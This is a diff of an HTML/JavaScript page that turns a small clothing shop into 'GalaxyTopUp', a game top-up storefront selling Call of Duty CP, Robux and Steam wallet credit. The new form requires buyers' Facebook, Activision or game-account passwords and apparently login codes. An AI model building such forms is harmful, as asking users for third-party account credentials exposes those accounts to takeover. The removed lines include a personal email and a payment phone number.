-<div class="category">
-<button onclick="show('tshirt')">T-Shirts</button>
-<button onclick="show('shirt')">Shirts</button>
-<button onclick="show('panjabi')">Panjabi</button>
+<!-- ═══════════════════════════════════════════════ -->
+<!-- PAGE 4 — SUCCESS -->
+<!-- ═══════════════════════════════════════════════ -->
+<div id="successPage" class="page">
+  <div class="success-page">
+    <span class="success-icon">🎉</span>
+    <h2>ORDER PLACED!</h2>
+    <p>Your order has been received. We will process your top-up within <strong>30 minutes</strong>.<br>
+    Thank you for choosing <span class="highlight">GalaxyTopUp</span>!</p>
+    <button class="btn-primary" style="width:100%; max-width:300px; margin:0 auto; display:block;" onclick="goHome(); resetAll();">
+      ← Back to Home
+    </button>
+  </div>
 </div>
 
-<!-- PRODUCTS -->
-<div class="products" id="products"></div>
+<!-- ═══════════════════════════════════════════════ -->
+<!-- CART SIDEBAR -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="cart-overlay" id="cartOverlay" onclick="toggleCart()">
+  <div class="cart-panel" onclick="event.stopPropagation()">
+    <div class="cart-head">
+      <h3>🛒 YOUR CART</h3>
+      <button class="close-cart" onclick="toggleCart()">✕</button>
+    </div>
 
-<!-- CART -->
-<div class="side-cart" id="cartBox">
+    <div class="cart-items" id="cartItems">
+      <div class="cart-empty">
+        <span class="icon">🛒</span>
+        Your cart is empty
+      </div>
+    </div>
 
-<h2>Your Cart</h2>
-<div id="cartItems"></div>
-<div id="total"></div>
-
-<form action="https://formsubmit.co/matrixofficialhub@gmail.com"
-method="POST" onsubmit="fillOrder()">
-
-<input type="hidden" name="_captcha" value="false">
-<input type="hidden" name="_subject" value="New Matrix Order">
-
-<input type="hidden" name="Order ID" id="orderId">
-<input type="hidden" name="Products" id="productList">
-
-<input type="text" name="Name" placeholder="Name" required>
-<input type="email" name="Email" placeholder="Email" required>
-<input type="text" name="Phone" placeholder="Phone" required>
-<textarea name="Address" placeholder="Address" required></textarea>
-
-<div><b>bKash: 01844175037</b></div>
-
-<button class="order-btn">Place Order</button>
-
-</form>
-
+    <div class="cart-footer">
+      <div class="cart-total">
+        <span>Total</span>
+        <span id="cartTotal">0 Taka</span>
+      </div>
+      <button class="cart-checkout-btn" onclick="cartCheckout()">Checkout All →</button>
+    </div>
+  </div>
 </div>
 
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- SCRIPT -->
+<!-- ═══════════════════════════════════════════════ -->
 <script>
-
-let cart=[];
-let current="tshirt";
-
-/* PRODUCTS */
-const data={
-tshirt:[
-{name:"Matrix T-Shirt",price:399,img:"tshirt1.png"},
-{name:"Ferrari T-Shirt",price:399,img:"tshirt3.png"},
-{name:"Naksha T-Shirt",price:450,img:"tshirt4.png"},
-{name:"T-Shirt 5",price:599,img:"tshirt5.png"},
-{name:"Money designed T-Shirt",price:499,img:"tshirt6.png"}
-],
-shirt:[
-{name:"Shirt 1",price:799,img:"shirt1.png"}
-],
-panjabi:[
-{name:"Panjabi 1",price:999,img:"panjabi1.png"}
-]
+// ── DATA ──────────────────────────────────────────
+const GAMES = {
+  cod: {
+    name: 'Call of Duty',
+    icon: '🎯',
+    iconBg: 'linear-gradient(135deg,#1a1a2e,#0f3460)',
+    desc: 'Warzone & Mobile CP Points',
+    currency: 'CP',
+    accountTypes: ['facebook','activision'],
+    packages: [
+      { label:'80+80 CP',   amount:'80+80 CP',   bonus:'+80 Bonus', price:120,  popular:false },
+      { label:'400+400 CP', amount:'400+400 CP', bonus:'+400 Bonus', price:570,  popular:true  },
+      { label:'800+800 CP', amount:'800+800 CP', bonus:'+800 Bonus', price:1099, popular:false },
+      { label:'2000+2000 CP',amount:'2000+2000 CP',bonus:'+2000 Bonus',price:2700,popular:false},
+    ]
+  },
+  roblox: {
+    name: 'Roblox',
+    icon: '🟥',
+    iconBg: 'linear-gradient(135deg,#cc0000,#ff6666)',
+    desc: 'Robux for your Roblox account',
+    currency: 'Robux',
+    accountTypes: [],
+    packages: [
+      { label:'400 Robux',  amount:'400 Robux',  bonus:'', price:280,  popular:false },
+      { label:'800 Robux',  amount:'800 Robux',  bonus:'', price:550,  popular:true  },
+      { label:'1700 Robux', amount:'1700 Robux', bonus:'', price:1100, popular:false },
+      { label:'4500 Robux', amount:'4500 Robux', bonus:'', price:2800, popular:false },
+    ]
+  },
+  steam: {
+    name: 'Steam',
+    icon: '🎮',
+    iconBg: 'linear-gradient(135deg,#1b2838,#2a475e)',
+    desc: 'Steam Wallet Dollars',
+    currency: '$',
+    accountTypes: [],
+    packages: [
+      { label:'$5 Steam',  amount:'$5 Wallet',  bonus:'', price:600,  popular:false },
+      { label:'$10 Steam', amount:'$10 Wallet', bonus:'', price:1180, popular:true  },
+      { label:'$20 Steam', amount:'$20 Wallet', bonus:'', price:2350, popular:false },
+      { label:'$50 Steam', amount:'$50 Wallet', bonus:'', price:5800, popular:false },
+    ]
+  }
 };
 
-/* SHOW PRODUCTS */
-function show(cat){
+// ── STATE ──────────────────────────────────────────
+let currentGame = null;
+let selectedPkg = null;
+let accountType = 'facebook';
+let cart = [];
 
-current=cat;
-
-let box=document.getElementById("products");
-box.innerHTML="";
-
-data[cat].forEach((p,i)=>{
-
-box.innerHTML+=`
-<div class="card">
-<img src="${p.img}">
-<div class="card-content">
-<h3>${p.name}</h3>
-<div class="price">${p.price}৳</div>
-<div class="stock">Available</div>
-
-<button class="buy" onclick="add('${cat}',${i})">
-Buy Now
-</button>
-
-</div>
-</div>
-`;
-
-});
-
+// ── NAVIGATION ────────────────────────────────────
+function showPage(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0,0);
 }
 
-/* ADD TO CART (QUANTITY SYSTEM) */
-function add(cat,i){
+function goHome() { showPage('homePage'); }
 
-let p=data[cat][i];
+function goToProduct() { showPage('productPage'); }
 
-let found = cart.find(item => item.name === p.name);
-
-if(found){
-found.qty++;
-}else{
-cart.push({...p, qty:1});
+function openGame(gameKey) {
+  currentGame = gameKey;
+  selectedPkg = null;
+  renderProductPage();
+  showPage('productPage');
 }
 
-updateCart();
+// ── PRODUCT PAGE ──────────────────────────────────
+function renderProductPage() {
+  const g = GAMES[currentGame];
 
+  // header
+  const icon = document.getElementById('prodIcon');
+  icon.textContent = g.icon;
+  icon.style.background = g.iconBg;
+
+  document.getElementById('prodName').textContent = g.name;
+  document.getElementById('prodDesc').textContent = g.desc;
+
+  // packages
+  const grid = document.getElementById('packagesGrid');
+  grid.innerHTML = '';
+  g.packages.forEach((pkg, i) => {
+    const div = document.createElement('div');
+    div.className = 'pkg-card';
+    div.id = `pkg_${i}`;
+    div.onclick = () => selectPkg(i);
+    div.innerHTML = `
+      ${pkg.popular ? '<span class="popular-tag">⭐ POPULAR</span>' : ''}
+      <div class="pkg-amount">${pkg.amount}</div>
+      ${pkg.bonus ? `<div class="pkg-bonus">${pkg.bonus}</div>` : '<div style="height:16px"></div>'}
+      <div class="pkg-price">${pkg.price} ৳</div>
+    `;
+    grid.appendChild(div);
+  });
+
+  // account section
+  document.getElementById('accountSection').style.display = 'none';
+  document.getElementById('orderSummary').style.display = 'none';
+
+  // account type tabs visibility
+  const hasTabs = g.accountTypes.length > 0;
+  document.getElementById('accountTypeSection').style.display = hasTabs ? 'block' : 'none';
+
+  if (!hasTabs) {
+    document.getElementById('fbFields').style.display = 'none';
+    document.getElementById('activFields').style.display = 'none';
+    document.getElementById('genericFields').style.display = 'block';
+  } else {
+    setAccountType('facebook');
+  }
 }
 
-/* INCREASE */
-function increase(i){
-cart[i].qty++;
-updateCart();
+function selectPkg(idx) {
+  const g = GAMES[currentGame];
+  selectedPkg = idx;
+
+  // highlight
+  document.querySelectorAll('.pkg-card').forEach(c => c.classList.remove('selected'));
+  document.getElementById(`pkg_${idx}`).classList.add('selected');
+
+  // summary
+  const pkg = g.packages[idx];
+  document.getElementById('sumGame').textContent = g.name;
+  document.getElementById('sumPkg').textContent = pkg.amount;
+  document.getElementById('sumPrice').textContent = pkg.price + ' ৳';
+  document.getElementById('orderSummary').style.display = 'block';
+  document.getElementById('accountSection').style.display = 'block';
 }
 
-/* DECREASE */
-function decrease(i){
-cart[i].qty--;
+function setAccountType(type) {
+  accountType = type;
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  event.target.classList.add('active');
 
-if(cart[i].qty <= 0){
-cart.splice(i,1);
+  document.getElementById('fbFields').style.display   = type === 'facebook'   ? 'block' : 'none';
+  document.getElementById('activFields').style.display = type === 'activision' ? 'block' : 'none';
 }
 
-updateCart();
+// ── VALIDATE ──────────────────────────────────────
+function validateForm() {
+  if (selectedPkg === null) { showToast('⚠️ Please select a package', true); return false; }
+
+  const fn = document.getElementById('firstName').value.trim();
+  const ln = document.getElementById('lastName').value.trim();
+  if (!fn || !ln) { showToast('⚠️ Please enter your name', true); return false; }
+
+  const g = GAMES[currentGame];
+  if (g.accountTypes.length > 0) {
+    if (accountType === 'facebook') {
+      if (!document.getElementById('fbEmail').value.trim()) { showToast('⚠️ Enter Email/Phone', true); return false; }
+      if (!document.getElementById('fbPass').value.trim())  { showToast('⚠️ Enter password', true); return false; }
+    } else {
+      if (!document.getElementById('activLogin').value.trim()) { showToast('⚠️ Enter Activision login', true); return false; }
+      if (!document.getElementById('activPass').value.trim())  { showToast('⚠️ Enter password', true); return false; }
+    }
+  } else {
+    if (!document.getElementById('genUser').value.trim()) { showToast('⚠️ Enter username/email', true); return false; }
+    if (!document.getElementById('genPass').value.trim()) { showToast('⚠️ Enter password', true); return false; }
+  }
+  return true;
 }
 
-/* REMOVE */
-function removeItem(i){
-cart.splice(i,1);
-updateCart();
+// ── PAYMENT ───────────────────────────────────────
+function proceedToPayment() {
+  if (!validateForm()) return;
+  const pkg = GAMES[currentGame].packages[selectedPkg];
+  document.getElementById('payAmount').textContent = pkg.price;
+  document.getElementById('trxInput').value = '';
+  showPage('paymentPage');
 }
 
-/* UPDATE CART */
-function updateCart(){
-
-let html="";
-let total=0;
-
-cart.forEach((c,i)=>{
-
-total += c.price * c.qty;
-
-html+=`
-<div class="cart-item">
-<b>${c.name}</b><br>
-
-${c.price}৳ × ${c.qty} = ${c.price*c.qty}৳<br>
-
-<button onclick="decrease(${i})">➖</button>
-<button onclick="increase(${i})">➕</button>
-<button onclick="removeItem(${i})">❌ Remove</button>
-</div>
-`;
-
-});
-
-document.getElementById("cartItems").innerHTML=html;
-document.getElementById("total").innerHTML="Total: "+total+"৳";
-document.getElementById("count").innerText=cart.reduce((a,b)=>a+b.qty,0);
-
+function confirmPayment() {
+  const trx = document.getElementById('trxInput').value.trim();
+  if (!trx) { showToast('⚠️ Please enter your Transaction ID', true); return; }
+  showPage('successPage');
 }
 
-/* CART TOGGLE */
-function toggleCart(){
-document.getElementById("cartBox").classList.toggle("active");
+// ── CART ──────────────────────────────────────────
+function addToCart() {
+  if (!validateForm()) return;
+  const g   = GAMES[currentGame];
+  const pkg = g.packages[selectedPkg];
+  cart.push({ game: g.name, icon: g.icon, pkg: pkg.amount, price: pkg.price });
+  updateCartUI();
+  showToast(`🛒 ${g.name} — ${pkg.amount} added to cart!`);
 }
 
-/* ORDER */
-function fillOrder(){
-
-document.getElementById("orderId").value="MF-"+Date.now();
-
-document.getElementById("productList").value=
-cart.map(c=>`${c.name} x${c.qty} = ${c.price*c.qty}৳`).join(", ");
-
+function removeFromCart(i) {
+  cart.splice(i, 1);
+  updateCartUI();
 }
 
-/* INIT */
-show("tshirt");
+function updateCartUI() {
+  const count = cart.reduce((s,i) => s + 1, 0);
+  document.getElementById('cartCount').textContent = count;
 
+  const total = cart.reduce((s,i) => s + i.price, 0);
+  document.getElementById('cartTotal').textContent = total + ' Taka';
+
+  const list = document.getElementById('cartItems');
+  if (cart.length === 0) {
+    list.innerHTML = '<div class="cart-empty"><span class="icon">🛒</span>Your cart is empty</div>';
+    return;
+  }
+  list.innerHTML = cart.map((item, i) => `
+    <div class="cart-item">
+      <div class="cart-item-icon">${item.icon}</div>
+      <div class="cart-item-info">
+        <div class="name">${item.game}</div>
+        <div class="pkg">${item.pkg}</div>
+      </div>
+      <div class="cart-item-price">${item.price} ৳</div>
+      <button class="cart-remove" onclick="removeFromCart(${i})">🗑</button>
+    </div>
+  `).join('');
+}
+
+function toggleCart() {
+  document.getElementById('cartOverlay').classList.toggle('open');
+}
+
+function cartCheckout() {
+  if (cart.length === 0) { showToast('⚠️ Cart is empty', true); return; }
+  const total = cart.reduce((s,i) => s + i.price, 0);
+  document.getElementById('payAmount').textContent = total;
+  document.getElementById('trxInput').value = '';
+  toggleCart();
+  showPage('paymentPage');
+}
+
+// ── NOTICE ────────────────────────────────────────
+let noticeEditing = false;
+function toggleNoticeEdit() {
+  noticeEditing = !noticeEditing;
+  const disp = document.getElementById('noticeDisplay');
+  const edit = document.getElementById('noticeEditor');
+  const ta   = document.getElementById('noticeTextarea');
+  if (noticeEditing) {
+    ta.value = disp.textContent.trim();
+    disp.style.display='none'; edit.style.display='block';
+  } else {
+    disp.style.display='block'; edit.style.display='none';
+  }
+}
+function saveNotice() {
+  const val = document.getElementById('noticeTextarea').value.trim();
+  document.getElementById('noticeDisplay').textContent = val || '(No notice)';
+  toggleNoticeEdit();
+  showToast('📌 Notice updated!');
+}
+
+// ── TOAST ─────────────────────────────────────────
+let toastTimer;
+function showToast(msg, err=false) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show' + (err ? ' error' : '');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => t.classList.remove('show'), 3000);
+}
+
+// ── RESET ─────────────────────────────────────────
+function resetAll() {
+  currentGame = null; selectedPkg = null; cart = [];
+  updateCartUI();
+  ['firstName','lastName','fbEmail','fbPass','fbCode1','fbCode2','fbCode3',
+   'activLogin','activPass','genUser','genPass','trxInput'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.value = '';
+  });
+}
 </script>
-
 </body>
 </html>
